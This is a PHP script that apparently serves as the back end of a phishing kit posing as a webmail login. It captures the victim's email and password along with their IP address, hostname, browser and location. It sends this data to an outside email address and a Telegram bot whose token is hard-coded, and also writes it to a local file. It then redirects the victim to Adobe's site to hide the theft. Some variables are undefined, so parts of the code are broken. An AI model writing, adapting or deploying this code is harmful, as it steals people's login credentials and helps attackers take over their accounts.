<?php 
$Ok= "toolsoff247@outlook.com"; 
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$email = trim($_POST['email']);
$password = trim($_POST['pass']);

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$fuck .= "|----------| webmail Login |--------------|\n";
	$fuck .= "Email          : ".$email."\n";
	$fuck .= "Pass           : ".$password."\n";
$fuck .= "Detail           : ".$eduser."\n";

	$fuck .= "|----------- I N F O | I P ----------------|\n";

$fuck .= "======= [ Ip & Hostname Info ] =======\n";
$fuck .= "Client IP : ".$ip."\n";
$fuck .= "City: {$geoplugin->city}\n";
$fuck .= "Region: {$geoplugin->region}\n";
$fuck .= "Country Name: {$geoplugin->countryName}\n";
$fuck .= "HostName : ".$hostname."\n";
$fuck .= "Date And Time : ".$date."\n";
$fuck .= "Browser Details : ".$user_agent."\n";
$fuck .= "=======+Vi3nas is HERE+======\n";
$subject = "webmail $ip";
{
$headers = "From: webmail <ShellHost@_ID>";
mail($Ok,$message,$subject,$fuck,$headers);
$file = fopen("../acid.txt","a");
fwrite($file,$fuck);
fclose($file);
$txt = $fuck;
$chat_id = "1069985640"; 
$bot_url = "bot7814111080:AAHUx3nXPeIoMont3TJmFTKtTd960FuuJsI"; 

    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);   

}
 header("Location: https://www.adobe.com/");
	$signal = 'ok';
	$msg = 'InValid Credentials';

?>
